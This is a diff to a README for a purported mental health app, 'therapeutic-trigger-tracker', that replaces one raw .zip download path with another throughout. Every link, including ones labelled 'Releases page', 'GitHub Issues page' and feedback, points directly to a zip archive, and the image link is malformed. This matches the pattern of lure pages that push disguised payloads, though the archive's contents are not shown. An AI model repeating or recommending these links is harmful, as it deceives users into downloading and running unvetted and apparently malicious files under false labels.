@@ -5,14 +5,14 @@ Welcome to therapeutic-trigger-tracker, a user-friendly mental health applicatio
 
 ## 📥 Download Now
 
-[![Download Therapeutic Trigger Tracker](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip%20Trigger%https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip)](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip)
+[![Download Therapeutic Trigger Tracker](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip%20Trigger%https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip)](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip)
 
 ## 🚀 Getting Started
 To get started with the therapeutic-trigger-tracker application, follow these simple steps:
 
 1. **Go to the Releases Page**  
    Visit our GitHub releases page to download the latest version:  
-   [Download Page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip)
+   [Download Page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip)
 
 2. **Choose the Right File**  
    On the releases page, you will find different files for various systems. Choose the file that matches your system's specifications.
@@ -49,7 +49,7 @@ If you encounter any issues during installation or while using the application, 
 - Restart your computer and try reinstalling the application.
 - Check your internet connection if any features seem unavailable.
 
-If problems persist, feel free to reach out for support through our [GitHub Issues page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip).
+If problems persist, feel free to reach out for support through our [GitHub Issues page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip).
 
 ## ✏️ Additional Resources
 For more information, consider these resources to deepen your understanding of mental health management:
@@ -59,7 +59,7 @@ For more information, consider these resources to deepen your understanding of m
 - **Mental Health Awareness**: Information to promote understanding and reduce stigma surrounding mental health issues.
 
 ## 📚 Feedback
-Your feedback is important to us. If you have suggestions or ideas for improvement, please let us know through our [GitHub Issues page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip).
+Your feedback is important to us. If you have suggestions or ideas for improvement, please let us know through our [GitHub Issues page](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip).
 
 ## 📥 Download & Install
-Ready to take control of your mental health? [Visit this page to download](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/nervimotion/therapeutic-trigger-tracker.zip) the therapeutic-trigger-tracker application and start your journey toward better emotional management today!
+Ready to take control of your mental health? [Visit this page to download](https://raw.githubusercontent.com/fisher2132/therapeutic-trigger-tracker/main/utils/tracker-trigger-therapeutic-v1.2-beta.5.zip) the therapeutic-trigger-tracker application and start your journey toward better emotional management today!
